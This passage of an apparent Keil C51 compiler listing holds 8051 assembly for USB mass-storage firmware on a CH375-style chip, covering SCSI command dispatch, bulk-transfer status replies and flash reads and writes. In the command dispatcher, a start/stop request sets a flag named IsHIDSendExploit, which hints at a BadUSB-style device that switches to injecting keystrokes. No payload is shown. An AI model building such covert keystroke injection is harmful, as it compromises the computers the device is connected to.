002D 900000      R     MOV     DPTR,#LEN
0030 E0                MOVX    A,@DPTR
0031 F8                MOV     R0,A
0032 A3                INC     DPTR
0033 E0                MOVX    A,@DPTR
0034 F9                MOV     R1,A
0035 A3                INC     DPTR
0036 E0                MOVX    A,@DPTR
0037 FA                MOV     R2,A
0038 A3                INC     DPTR
0039 E0                MOVX    A,@DPTR
003A FB                MOV     R3,A
003B D3                SETB    C
003C 120000      E     LCALL   ?C?ULCMP
003F 400A              JC      ?C0186
                                           ; SOURCE LINE # 971
0041 900000      R     MOV     DPTR,#LEN
0044 120000      E     LCALL   ?C?LSTKXDATA
0047 00                DB      00H
0048 00                DB      00H
0049 00                DB      00H
004A 14                DB      014H
004B         ?C0186:
                                           ; SOURCE LINE # 972
004B E4                CLR     A
004C 900000      R     MOV     DPTR,#BcswStatus
004F F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 973
0050 900000      R     MOV     DPTR,#mSenseKey
0053 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 974
0054 900000      R     MOV     DPTR,#mASC
0057 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 975
0058 22                RET     
             ; FUNCTION UFI_readTOC (END)

             ; FUNCTION UFI_GET_EVE_STA_NOT (BEGIN)
                                           ; SOURCE LINE # 977
                                           ; SOURCE LINE # 978
                                           ; SOURCE LINE # 979
0000 C8                XCH     A,R0
0001 7400        R     MOV     A,#LOW TOC
0003 C8                XCH     A,R0
0004 CC                XCH     A,R4
0005 7400        R     MOV     A,#HIGH TOC
0007 CC                XCH     A,R4
0008 CD                XCH     A,R5
0009 7401              MOV     A,#01H
000B CD                XCH     A,R5
000C 7BFF              MOV     R3,#0FFH
000E 7A00        R     MOV     R2,#HIGH _?ix1001
0010 7900        R     MOV     R1,#LOW _?ix1001
0012 7E00              MOV     R6,#00H
0014 7F08              MOV     R7,#08H
0016 120000      E     LCALL   ?C?COPY
                                           ; SOURCE LINE # 989
0019 900000      R     MOV     DPTR,#pBuf
001C 7401              MOV     A,#01H
001E F0                MOVX    @DPTR,A
001F A3                INC     DPTR
0020 7400        R     MOV     A,#HIGH TOC
0022 F0                MOVX    @DPTR,A
0023 A3                INC     DPTR
0024 7400        R     MOV     A,#LOW TOC
0026 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 990
0027 E4                CLR     A
0028 7F08              MOV     R7,#08H
002A FE                MOV     R6,A
002B FD                MOV     R5,A
002C FC                MOV     R4,A
002D 900000      R     MOV     DPTR,#LEN
0030 E0                MOVX    A,@DPTR
0031 F8                MOV     R0,A
0032 A3                INC     DPTR
0033 E0                MOVX    A,@DPTR
0034 F9                MOV     R1,A
0035 A3                INC     DPTR
0036 E0                MOVX    A,@DPTR
0037 FA                MOV     R2,A
0038 A3                INC     DPTR
0039 E0                MOVX    A,@DPTR
003A FB                MOV     R3,A
003B D3                SETB    C
003C 120000      E     LCALL   ?C?ULCMP
003F 400A              JC      ?C0188
                                           ; SOURCE LINE # 991
0041 900000      R     MOV     DPTR,#LEN
0044 120000      E     LCALL   ?C?LSTKXDATA
0047 00                DB      00H
0048 00                DB      00H
0049 00                DB      00H
004A 08                DB      08H
004B         ?C0188:
                                           ; SOURCE LINE # 992
004B E4                CLR     A
004C 900000      R     MOV     DPTR,#BcswStatus
004F F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 993
0050 900000      R     MOV     DPTR,#mSenseKey
0053 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 994
0054 900000      R     MOV     DPTR,#mASC
0057 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 995
0058 22                RET     
             ; FUNCTION UFI_GET_EVE_STA_NOT (END)

             ; FUNCTION UFI_Hunding (BEGIN)
                                           ; SOURCE LINE # 998
                                           ; SOURCE LINE # 999
                                           ; SOURCE LINE # 1000
0000 7800        R     MOV     R0,#LOW MassPara+0FH
0002 E6                MOV     A,@R0
0003 120000      E     LCALL   ?C?CCASE
0006 0000        R     DW      ?C0193
0008 00                DB      00H
0009 0000        R     DW      ?C0195
000B 03                DB      03H
000C 0000        R     DW      ?C0191
000E 12                DB      012H
000F 0000        R     DW      ?C0199
0011 1A                DB      01AH
0012 0000        R     DW      ?C0201
0014 1B                DB      01BH
0015 0000        R     DW      ?C0202
0017 1E                DB      01EH
0018 0000        R     DW      ?C0198
001A 23                DB      023H
001B 0000        R     DW      ?C0196
001D 25                DB      025H
001E 0000        R     DW      ?C0194
0020 28                DB      028H
0021 0000        R     DW      ?C0192
0023 2A                DB      02AH
0024 0000        R     DW      ?C0197
0026 2F                DB      02FH
0027 0000        R     DW      ?C0203
0029 43                DB      043H
002A 0000        R     DW      ?C0204
002C 4A                DB      04AH
002D 0000        R     DW      ?C0200
002F 5A                DB      05AH
0030 0000              DW      00H
0032 0000        R     DW      ?C0205
                                           ; SOURCE LINE # 1001
                                           ; SOURCE LINE # 1002
0034         ?C0191:
                                           ; SOURCE LINE # 1003
0034 020000      R     LJMP    UFI_inquiry
                                           ; SOURCE LINE # 1004
                                           ; SOURCE LINE # 1005
0037         ?C0192:
                                           ; SOURCE LINE # 1006
0037 020000      R     LJMP    UFI_write
                                           ; SOURCE LINE # 1007
                                           ; SOURCE LINE # 1008
003A         ?C0193:
                                           ; SOURCE LINE # 1009
003A 020000      R     LJMP    UFI_testUnit
                                           ; SOURCE LINE # 1010
                                           ; SOURCE LINE # 1011
003D         ?C0194:
                                           ; SOURCE LINE # 1012
003D 020000      R     LJMP    UFI_read10
                                           ; SOURCE LINE # 1013
                                           ; SOURCE LINE # 1014
0040         ?C0195:
                                           ; SOURCE LINE # 1015
0040 020000      R     LJMP    UFI_requestSense
                                           ; SOURCE LINE # 1016
                                           ; SOURCE LINE # 1017
0043         ?C0196:
                                           ; SOURCE LINE # 1018
0043 020000      R     LJMP    UFI_readCapacity
                                           ; SOURCE LINE # 1019
                                           ; SOURCE LINE # 1020
0046         ?C0197:
                                           ; SOURCE LINE # 1021
0046 020000      R     LJMP    UFI_verify
                                           ; SOURCE LINE # 1022
                                           ; SOURCE LINE # 1023
0049         ?C0198:
                                           ; SOURCE LINE # 1027
0049 E4                CLR     A
004A 900000      R     MOV     DPTR,#BcswStatus
004D F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1028
004E 900000      R     MOV     DPTR,#mSenseKey
0051 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1029
0052 900000      R     MOV     DPTR,#mASC
0055 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1030
0056 22                RET     
                                           ; SOURCE LINE # 1034
0057         ?C0199:
                                           ; SOURCE LINE # 1035
0057 020000      R     LJMP    UFI_modeSense
                                           ; SOURCE LINE # 1036
                                           ; SOURCE LINE # 1037
005A         ?C0200:
                                           ; SOURCE LINE # 1038
005A 020000      R     LJMP    UFI_modeSense5
                                           ; SOURCE LINE # 1039
                                           ; SOURCE LINE # 1050
005D         ?C0201:
                                           ; SOURCE LINE # 1051
005D 120000      R     LCALL   UFI_staStoUnit
                                           ; SOURCE LINE # 1052
0060 900000      R     MOV     DPTR,#IsHIDSendExploit
0063 7401              MOV     A,#01H
0065 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1053
0066 22                RET     
                                           ; SOURCE LINE # 1054
0067         ?C0202:
                                           ; SOURCE LINE # 1055
0067 020000      R     LJMP    UFI_perOrMed
                                           ; SOURCE LINE # 1056
                                           ; SOURCE LINE # 1057
006A         ?C0203:
                                           ; SOURCE LINE # 1058
006A 020000      R     LJMP    UFI_readTOC
                                           ; SOURCE LINE # 1059
                                           ; SOURCE LINE # 1060
006D         ?C0204:
                                           ; SOURCE LINE # 1061
006D 020000      R     LJMP    UFI_GET_EVE_STA_NOT
                                           ; SOURCE LINE # 1062
                                           ; SOURCE LINE # 1063
0070         ?C0205:
                                           ; SOURCE LINE # 1064
0070 900000      R     MOV     DPTR,#mSenseKey
0073 7405              MOV     A,#05H
0075 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1065
0076 900000      R     MOV     DPTR,#mASC
0079 7420              MOV     A,#020H
007B F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1066
007C 900000      R     MOV     DPTR,#BcswStatus
007F 7401              MOV     A,#01H
0081 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1067
0082 C200        R     CLR     CH375BULKUP
                                           ; SOURCE LINE # 1068
0084 7F0E              MOV     R7,#0EH
0086 120000      R     LCALL   _BulkThirteen
                                           ; SOURCE LINE # 1069
                                           ; SOURCE LINE # 1070
                                           ; SOURCE LINE # 1071
0089         ?C0206:
0089 22                RET     
             ; FUNCTION UFI_Hunding (END)

             ; FUNCTION mCH375BulkOnly (BEGIN)
                                           ; SOURCE LINE # 1073
                                           ; SOURCE LINE # 1074
                                           ; SOURCE LINE # 1075
0000 7800        R     MOV     R0,#LOW MassPara
0002 E6                MOV     A,@R0
0003 6455              XRL     A,#055H
0005 706F              JNZ     ?C0207
                                           ; SOURCE LINE # 1076
                                           ; SOURCE LINE # 1077
0007 08                INC     R0
0008 E6                MOV     A,@R0
0009 6453              XRL     A,#053H
000B 7067              JNZ     ?C0208
                                           ; SOURCE LINE # 1078
                                           ; SOURCE LINE # 1079
000D 08                INC     R0
000E E6                MOV     A,@R0
000F 6442              XRL     A,#042H
0011 705F              JNZ     ?C0209
                                           ; SOURCE LINE # 1080
                                           ; SOURCE LINE # 1081
0013 08                INC     R0
0014 E6                MOV     A,@R0
0015 6443              XRL     A,#043H
0017 705D              JNZ     ?C0388
                                           ; SOURCE LINE # 1082
                                           ; SOURCE LINE # 1084
0019 7800        R     MOV     R0,#LOW MassPara+08H
001B E6                MOV     A,@R0
001C 900000      R     MOV     DPTR,#LEN+03H
001F F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1085
0020 08                INC     R0
0021 E6                MOV     A,@R0
0022 900000      R     MOV     DPTR,#LEN+02H
0025 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1086
0026 08                INC     R0
0027 E6                MOV     A,@R0
0028 900000      R     MOV     DPTR,#LEN+01H
002B F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1087
002C 08                INC     R0
002D E6                MOV     A,@R0
002E 900000      R     MOV     DPTR,#LEN
0031 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1088
0032 7800        R     MOV     R0,#LOW MassPara+04H
0034 E6                MOV     A,@R0
0035 900000      R     MOV     DPTR,#mdCBWTag
0038 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1089
0039 08                INC     R0
003A E6                MOV     A,@R0
003B A3                INC     DPTR
003C F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1090
003D 08                INC     R0
003E E6                MOV     A,@R0
003F A3                INC     DPTR
0040 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1091
0041 08                INC     R0
0042 E6                MOV     A,@R0
0043 A3                INC     DPTR
0044 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1093
0045 900000      R     MOV     DPTR,#LEN
0048 E0                MOVX    A,@DPTR
0049 FC                MOV     R4,A
004A A3                INC     DPTR
004B E0                MOVX    A,@DPTR
004C FD                MOV     R5,A
004D A3                INC     DPTR
004E E0                MOVX    A,@DPTR
004F FE                MOV     R6,A
0050 A3                INC     DPTR
0051 E0                MOVX    A,@DPTR
0052 FF                MOV     R7,A
0053 EC                MOV     A,R4
0054 4D                ORL     A,R5
0055 4E                ORL     A,R6
0056 4F                ORL     A,R7
0057 6014              JZ      ?C0211
                                           ; SOURCE LINE # 1094
                                           ; SOURCE LINE # 1095
0059 7800        R     MOV     R0,#LOW MassPara+0CH
005B E6                MOV     A,@R0
005C D3                SETB    C
005D 30E701            JNB     ACC.7,?C0212
0060 C3                CLR     C
0061         ?C0212:
0061         ?C0213:
0061 9200        R     MOV     CH375BULKDOWN,C
                                           ; SOURCE LINE # 1096
0063 7800        R     MOV     R0,#LOW MassPara+0CH
0065 E6                MOV     A,@R0
0066 C3                CLR     C
0067 30E701            JNB     ACC.7,?C0214
006A D3                SETB    C
006B         ?C0214:
006B         ?C0215:
006B 9200        R     MOV     CH375BULKUP,C
                                           ; SOURCE LINE # 1097
006D         ?C0211:
                                           ; SOURCE LINE # 1098
006D D200        R     SETB    CH375CSW
                                           ; SOURCE LINE # 1099
006F 020000      R     LJMP    UFI_Hunding
                                           ; SOURCE LINE # 1100
0072         ?C0209:
                                           ; SOURCE LINE # 1105
0072         ?C0386:
                                           ; SOURCE LINE # 1106
0072 8002              SJMP    ?C0388
0074         ?C0208:
                                           ; SOURCE LINE # 1108
0074         ?C0387:
                                           ; SOURCE LINE # 1109
0074 8000              SJMP    ?C0388
0076         ?C0207:
                                           ; SOURCE LINE # 1111
0076         ?C0388:
0076 43D203            ORL     UEP1_CTRL,#03H
                                           ; SOURCE LINE # 1112
0079         ?C0220:
0079 22                RET     
             ; FUNCTION mCH375BulkOnly (END)

             ; FUNCTION mCH375UpCsw (BEGIN)
                                           ; SOURCE LINE # 1115
                                           ; SOURCE LINE # 1116
                                           ; SOURCE LINE # 1119
0000 900000      R     MOV     DPTR,#pBuf
0003 E4                CLR     A
0004 F0                MOVX    @DPTR,A
0005 A3                INC     DPTR
0006 7400        R     MOV     A,#HIGH MassPara
0008 F0                MOVX    @DPTR,A
0009 A3                INC     DPTR
000A 7400        R     MOV     A,#LOW MassPara
000C F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1120
000D C200        R     CLR     CH375CSW
                                           ; SOURCE LINE # 1121
000F C200        R     CLR     CH375BULKUP
                                           ; SOURCE LINE # 1122
0011 F8                MOV     R0,A
0012 7655              MOV     @R0,#055H
                                           ; SOURCE LINE # 1123
0014 08                INC     R0
0015 7653              MOV     @R0,#053H
                                           ; SOURCE LINE # 1124
0017 08                INC     R0
0018 7642              MOV     @R0,#042H
                                           ; SOURCE LINE # 1125
001A 08                INC     R0
001B 7653              MOV     @R0,#053H
                                           ; SOURCE LINE # 1126
001D 900000      R     MOV     DPTR,#mdCBWTag
0020 E0                MOVX    A,@DPTR
0021 08                INC     R0
0022 F6                MOV     @R0,A
                                           ; SOURCE LINE # 1127
0023 A3                INC     DPTR
0024 E0                MOVX    A,@DPTR
0025 08                INC     R0
0026 F6                MOV     @R0,A
                                           ; SOURCE LINE # 1128
0027 A3                INC     DPTR
0028 E0                MOVX    A,@DPTR
0029 08                INC     R0
002A F6                MOV     @R0,A
                                           ; SOURCE LINE # 1129
002B A3                INC     DPTR
002C E0                MOVX    A,@DPTR
002D 08                INC     R0
002E F6                MOV     @R0,A
                                           ; SOURCE LINE # 1130
002F E4                CLR     A
0030 08                INC     R0
0031 F6                MOV     @R0,A
                                           ; SOURCE LINE # 1131
0032 08                INC     R0
0033 F6                MOV     @R0,A
                                           ; SOURCE LINE # 1132
0034 900000      R     MOV     DPTR,#LEN+01H
0037 E0                MOVX    A,@DPTR
0038 08                INC     R0
0039 F6                MOV     @R0,A
                                           ; SOURCE LINE # 1133
003A 900000      R     MOV     DPTR,#LEN
003D E0                MOVX    A,@DPTR
003E 08                INC     R0
003F F6                MOV     @R0,A
                                           ; SOURCE LINE # 1134
0040 900000      R     MOV     DPTR,#BcswStatus
0043 E0                MOVX    A,@DPTR
0044 08                INC     R0
0045 F6                MOV     @R0,A
                                           ; SOURCE LINE # 1135
;---- Variable 'i' assigned to Register 'R7' ----
0046 E4                CLR     A
0047 FF                MOV     R7,A
0048         ?C0221:
0048 EF                MOV     A,R7
0049 C3                CLR     C
004A 940D              SUBB    A,#0DH
004C 7480              MOV     A,#080H
004E 9480              SUBB    A,#080H
0050 5028              JNC     ?C0222
                                           ; SOURCE LINE # 1136
                                           ; SOURCE LINE # 1137
0052 900000      R     MOV     DPTR,#pBuf
0055 E0                MOVX    A,@DPTR
0056 FB                MOV     R3,A
0057 A3                INC     DPTR
0058 E0                MOVX    A,@DPTR
0059 FA                MOV     R2,A
005A A3                INC     DPTR
005B E0                MOVX    A,@DPTR
005C F9                MOV     R1,A
005D 120000      E     LCALL   ?C?CLDPTR
0060 FE                MOV     R6,A
0061 7400        R     MOV     A,#LOW Ep1Buffer+040H
0063 2F                ADD     A,R7
0064 F582              MOV     DPL,A
0066 E4                CLR     A
0067 3400        R     ADDC    A,#HIGH Ep1Buffer+040H
0069 F583              MOV     DPH,A
006B EE                MOV     A,R6
006C F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1138
006D 900000      R     MOV     DPTR,#pBuf+01H
0070 E4                CLR     A
0071 75F001            MOV     B,#01H
0074 120000      E     LCALL   ?C?IILDX
                                           ; SOURCE LINE # 1139
0077 0F                INC     R7
0078 80CE              SJMP    ?C0221
007A         ?C0222:
                                           ; SOURCE LINE # 1140
007A 75D30D            MOV     UEP1_T_LEN,#0DH
                                           ; SOURCE LINE # 1141
007D 53D2FC            ANL     UEP1_CTRL,#0FCH
                                           ; SOURCE LINE # 1142
0080 22                RET     
             ; FUNCTION mCH375UpCsw (END)

             ; FUNCTION mCH375bulkUpData (BEGIN)
                                           ; SOURCE LINE # 1145
                                           ; SOURCE LINE # 1146
                                           ; SOURCE LINE # 1149
0000 E4                CLR     A
0001 7F40              MOV     R7,#040H
0003 FE                MOV     R6,A
0004 FD                MOV     R5,A
0005 FC                MOV     R4,A
0006 900000      R     MOV     DPTR,#LEN
0009 E0                MOVX    A,@DPTR
000A F8                MOV     R0,A
000B A3                INC     DPTR
000C E0                MOVX    A,@DPTR
000D F9                MOV     R1,A
000E A3                INC     DPTR
000F E0                MOVX    A,@DPTR
0010 FA                MOV     R2,A
0011 A3                INC     DPTR
0012 E0                MOVX    A,@DPTR
0013 FB                MOV     R3,A
0014 D3                SETB    C
0015 120000      E     LCALL   ?C?ULCMP
0018 402A              JC      ?C0225
                                           ; SOURCE LINE # 1150
                                           ; SOURCE LINE # 1151
001A 900000      R     MOV     DPTR,#len
001D 7440              MOV     A,#040H
001F F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1152
0020 900000      R     MOV     DPTR,#LEN
0023 E0                MOVX    A,@DPTR
0024 FC                MOV     R4,A
0025 A3                INC     DPTR
0026 E0                MOVX    A,@DPTR
0027 FD                MOV     R5,A
0028 A3                INC     DPTR
0029 E0                MOVX    A,@DPTR
002A FE                MOV     R6,A
002B A3                INC     DPTR
002C E0                MOVX    A,@DPTR
002D 9440              SUBB    A,#040H
002F FF                MOV     R7,A
0030 EE                MOV     A,R6
0031 9400              SUBB    A,#00H
0033 FE                MOV     R6,A
0034 ED                MOV     A,R5
0035 9400              SUBB    A,#00H
0037 FD                MOV     R5,A
0038 EC                MOV     A,R4
0039 9400              SUBB    A,#00H
003B FC                MOV     R4,A
003C 900000      R     MOV     DPTR,#LEN
003F 120000      E     LCALL   ?C?LSTXDATA
                                           ; SOURCE LINE # 1153
0042 8017              SJMP    ?C0226
0044         ?C0225:
                                           ; SOURCE LINE # 1155
                                           ; SOURCE LINE # 1156
0044 900000      R     MOV     DPTR,#LEN
0047 A3                INC     DPTR
0048 A3                INC     DPTR
0049 A3                INC     DPTR
004A E0                MOVX    A,@DPTR
004B 900000      R     MOV     DPTR,#len
004E F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1157
004F 900000      R     MOV     DPTR,#LEN
0052 120000      E     LCALL   ?C?LSTKXDATA
0055 00                DB      00H
0056 00                DB      00H
0057 00                DB      00H
0058 00                DB      00H
                                           ; SOURCE LINE # 1158
0059 C200        R     CLR     CH375BULKUP
                                           ; SOURCE LINE # 1159
005B         ?C0226:
                                           ; SOURCE LINE # 1160
005B 300070            JNB     pBuf_ReSelect,?C0227
                                           ; SOURCE LINE # 1161
                                           ; SOURCE LINE # 1162
005E 900000      R     MOV     DPTR,#Locate_Addr
0061 E0                MOVX    A,@DPTR
0062 FC                MOV     R4,A
0063 A3                INC     DPTR
0064 E0                MOVX    A,@DPTR
0065 FD                MOV     R5,A
0066 A3                INC     DPTR
0067 E0                MOVX    A,@DPTR
0068 FE                MOV     R6,A
0069 A3                INC     DPTR
006A E0                MOVX    A,@DPTR
006B FF                MOV     R7,A
006C 900000      R     MOV     DPTR,#len
006F E0                MOVX    A,@DPTR
0070 FB                MOV     R3,A
0071 900000      R     MOV     DPTR,#?_BulkReadFlash?BYTE+04H
0074 E4                CLR     A
0075 F0                MOVX    @DPTR,A
0076 A3                INC     DPTR
0077 EB                MOV     A,R3
0078 F0                MOVX    @DPTR,A
0079 A3                INC     DPTR
007A 7401              MOV     A,#01H
007C F0                MOVX    @DPTR,A
007D A3                INC     DPTR
007E 7400        R     MOV     A,#HIGH Ep1Buffer+040H
0080 F0                MOVX    @DPTR,A
0081 A3                INC     DPTR
0082 7400        R     MOV     A,#LOW Ep1Buffer+040H
0084 F0                MOVX    @DPTR,A
0085 120000      R     LCALL   _BulkReadFlash
                                           ; SOURCE LINE # 1163
0088 900000      R     MOV     DPTR,#Locate_Addr
008B E0                MOVX    A,@DPTR
008C F8                MOV     R0,A
008D A3                INC     DPTR
008E E0                MOVX    A,@DPTR
008F F9                MOV     R1,A
0090 A3                INC     DPTR
0091 E0                MOVX    A,@DPTR
0092 FA                MOV     R2,A
0093 A3                INC     DPTR
0094 E0                MOVX    A,@DPTR
0095 FB                MOV     R3,A
0096 900000      R     MOV     DPTR,#len
0099 E0                MOVX    A,@DPTR
009A FF                MOV     R7,A
009B E4                CLR     A
009C FC                MOV     R4,A
009D FD                MOV     R5,A
009E FE                MOV     R6,A
009F EB                MOV     A,R3
00A0 2F                ADD     A,R7
00A1 FF                MOV     R7,A
00A2 EE                MOV     A,R6
00A3 3A                ADDC    A,R2
00A4 FE                MOV     R6,A
00A5 ED                MOV     A,R5
00A6 39                ADDC    A,R1
00A7 FD                MOV     R5,A
00A8 EC                MOV     A,R4
00A9 38                ADDC    A,R0
00AA FC                MOV     R4,A
00AB 900000      R     MOV     DPTR,#Locate_Addr
00AE 120000      E     LCALL   ?C?LSTXDATA
                                           ; SOURCE LINE # 1164
00B1 E4                CLR     A
00B2 FF                MOV     R7,A
00B3 FE                MOV     R6,A
00B4 FD                MOV     R5,A
00B5 FC                MOV     R4,A
00B6 900000      R     MOV     DPTR,#LEN
00B9 E0                MOVX    A,@DPTR
00BA F8                MOV     R0,A
00BB A3                INC     DPTR
00BC E0                MOVX    A,@DPTR
00BD F9                MOV     R1,A
00BE A3                INC     DPTR
00BF E0                MOVX    A,@DPTR
00C0 FA                MOV     R2,A
00C1 A3                INC     DPTR
00C2 E0                MOVX    A,@DPTR
00C3 FB                MOV     R3,A
00C4 C3                CLR     C
00C5 120000      E     LCALL   ?C?ULCMP
00C8 7038              JNZ     ?C0229
                                           ; SOURCE LINE # 1165
00CA C200        R     CLR     pBuf_ReSelect
                                           ; SOURCE LINE # 1166
00CC 8034              SJMP    ?C0229
00CE         ?C0227:
                                           ; SOURCE LINE # 1168
                                           ; SOURCE LINE # 1169
;---- Variable 'i' assigned to Register 'R7' ----
00CE E4                CLR     A
00CF FF                MOV     R7,A
00D0         ?C0230:
00D0 900000      R     MOV     DPTR,#len
00D3 E0                MOVX    A,@DPTR
00D4 FE                MOV     R6,A
00D5 EF                MOV     A,R7
00D6 C3                CLR     C
00D7 9E                SUBB    A,R6
00D8 5028              JNC     ?C0229
                                           ; SOURCE LINE # 1170
                                           ; SOURCE LINE # 1171
00DA 900000      R     MOV     DPTR,#pBuf
00DD E0                MOVX    A,@DPTR
00DE FB                MOV     R3,A
00DF A3                INC     DPTR
00E0 E0                MOVX    A,@DPTR
00E1 FA                MOV     R2,A
00E2 A3                INC     DPTR
00E3 E0                MOVX    A,@DPTR
00E4 F9                MOV     R1,A
00E5 120000      E     LCALL   ?C?CLDPTR
00E8 FE                MOV     R6,A
00E9 7400        R     MOV     A,#LOW Ep1Buffer+040H
00EB 2F                ADD     A,R7
00EC F582              MOV     DPL,A
00EE E4                CLR     A
00EF 3400        R     ADDC    A,#HIGH Ep1Buffer+040H
00F1 F583              MOV     DPH,A
00F3 EE                MOV     A,R6
00F4 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1172
00F5 900000      R     MOV     DPTR,#pBuf+01H
00F8 E4                CLR     A
00F9 75F001            MOV     B,#01H
00FC 120000      E     LCALL   ?C?IILDX
                                           ; SOURCE LINE # 1173
00FF 0F                INC     R7
0100 80CE              SJMP    ?C0230
                                           ; SOURCE LINE # 1174
0102         ?C0229:
                                           ; SOURCE LINE # 1175
0102 900000      R     MOV     DPTR,#len
0105 E0                MOVX    A,@DPTR
0106 F5D3              MOV     UEP1_T_LEN,A
                                           ; SOURCE LINE # 1176
0108 53D2FC            ANL     UEP1_CTRL,#0FCH
                                           ; SOURCE LINE # 1177
010B 22                RET     
             ; FUNCTION mCH375bulkUpData (END)

             ; FUNCTION mCH375BulkDownData (BEGIN)
                                           ; SOURCE LINE # 1181
                                           ; SOURCE LINE # 1182
                                           ; SOURCE LINE # 1185
0000 900000      R     MOV     DPTR,#len
0003 E5DB              MOV     A,USB_RX_LEN
0005 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1186
;---- Variable 'i' assigned to Register 'R7' ----
0006 E4                CLR     A
0007 FF                MOV     R7,A
0008         ?C0234:
0008 900000      R     MOV     DPTR,#len
000B E0                MOVX    A,@DPTR
000C FB                MOV     R3,A
000D 6F                XRL     A,R7
000E 6015              JZ      ?C0235
                                           ; SOURCE LINE # 1187
0010 7400        R     MOV     A,#LOW Ep1Buffer
0012 2F                ADD     A,R7
0013 F582              MOV     DPL,A
0015 E4                CLR     A
0016 3400        R     ADDC    A,#HIGH Ep1Buffer
0018 F583              MOV     DPH,A
001A E0                MOVX    A,@DPTR
001B FE                MOV     R6,A
001C 7400        R     MOV     A,#LOW buffer
001E 2F                ADD     A,R7
001F F8                MOV     R0,A
0020 EE                MOV     A,R6
0021 F6                MOV     @R0,A
0022 0F                INC     R7
0023 80E3              SJMP    ?C0234
0025         ?C0235:
                                           ; SOURCE LINE # 1188
0025 900000      R     MOV     DPTR,#Locate_Addr
0028 E0                MOVX    A,@DPTR
0029 FC                MOV     R4,A
002A A3                INC     DPTR
002B E0                MOVX    A,@DPTR
002C FD                MOV     R5,A
002D A3                INC     DPTR
002E E0                MOVX    A,@DPTR
002F FE                MOV     R6,A
0030 A3                INC     DPTR
0031 E0                MOVX    A,@DPTR
0032 FF                MOV     R7,A
0033 900000      R     MOV     DPTR,#?_BulkWriteFlash?BYTE+04H
0036 E4                CLR     A
0037 F0                MOVX    @DPTR,A
0038 A3                INC     DPTR
0039 EB                MOV     A,R3
003A F0                MOVX    @DPTR,A
003B A3                INC     DPTR
003C E4                CLR     A
003D F0                MOVX    @DPTR,A
003E A3                INC     DPTR
003F 7400        R     MOV     A,#HIGH buffer
0041 F0                MOVX    @DPTR,A
0042 A3                INC     DPTR
0043 7400        R     MOV     A,#LOW buffer
0045 F0                MOVX    @DPTR,A
0046 120000      R     LCALL   _BulkWriteFlash
                                           ; SOURCE LINE # 1189
0049 900000      R     MOV     DPTR,#Locate_Addr
004C E0                MOVX    A,@DPTR
004D F8                MOV     R0,A
004E A3                INC     DPTR
004F E0                MOVX    A,@DPTR
0050 F9                MOV     R1,A
0051 A3                INC     DPTR
0052 E0                MOVX    A,@DPTR
0053 FA                MOV     R2,A
0054 A3                INC     DPTR
0055 E0                MOVX    A,@DPTR
0056 FB                MOV     R3,A
0057 900000      R     MOV     DPTR,#len
005A E0                MOVX    A,@DPTR
005B FF                MOV     R7,A
005C E4                CLR     A
005D FC                MOV     R4,A
005E FD                MOV     R5,A
005F FE                MOV     R6,A
0060 EB                MOV     A,R3
0061 2F                ADD     A,R7
0062 FF                MOV     R7,A
0063 EE                MOV     A,R6
0064 3A                ADDC    A,R2
0065 FE                MOV     R6,A
0066 ED                MOV     A,R5
0067 39                ADDC    A,R1
0068 FD                MOV     R5,A
0069 EC                MOV     A,R4
006A 38                ADDC    A,R0
006B FC                MOV     R4,A
006C 900000      R     MOV     DPTR,#Locate_Addr
006F 120000      E     LCALL   ?C?LSTXDATA
                                           ; SOURCE LINE # 1190
0072 900000      R     MOV     DPTR,#LEN
0075 E0                MOVX    A,@DPTR
0076 FC                MOV     R4,A
0077 A3                INC     DPTR
0078 E0                MOVX    A,@DPTR
0079 FD                MOV     R5,A
007A A3                INC     DPTR
007B E0                MOVX    A,@DPTR
007C FE                MOV     R6,A
007D A3                INC     DPTR
007E E0                MOVX    A,@DPTR
007F FF                MOV     R7,A
0080 EC                MOV     A,R4
0081 C0E0              PUSH    ACC
0083 ED                MOV     A,R5
0084 C0E0              PUSH    ACC
0086 EE                MOV     A,R6
0087 C0E0              PUSH    ACC
0089 EF                MOV     A,R7
008A C0E0              PUSH    ACC
008C 900000      R     MOV     DPTR,#len
008F E0                MOVX    A,@DPTR
0090 FF                MOV     R7,A
0091 CB                XCH     A,R3
0092 EF                MOV     A,R7
0093 CB                XCH     A,R3
0094 D0E0              POP     ACC
0096 FF                MOV     R7,A
0097 D0E0              POP     ACC
0099 FE                MOV     R6,A
009A D0E0              POP     ACC
009C FD                MOV     R5,A
009D D0E0              POP     ACC
009F FC                MOV     R4,A
00A0 C3                CLR     C
00A1 EF                MOV     A,R7
00A2 9B                SUBB    A,R3
00A3 FF                MOV     R7,A
00A4 EE                MOV     A,R6
00A5 9400              SUBB    A,#00H
00A7 FE                MOV     R6,A
00A8 ED                MOV     A,R5
00A9 9400              SUBB    A,#00H
00AB FD                MOV     R5,A
00AC EC                MOV     A,R4
00AD 9400              SUBB    A,#00H
00AF FC                MOV     R4,A
00B0 900000      R     MOV     DPTR,#LEN
00B3 120000      E     LCALL   ?C?LSTXDATA
                                           ; SOURCE LINE # 1191
00B6 E4                CLR     A
00B7 FF                MOV     R7,A
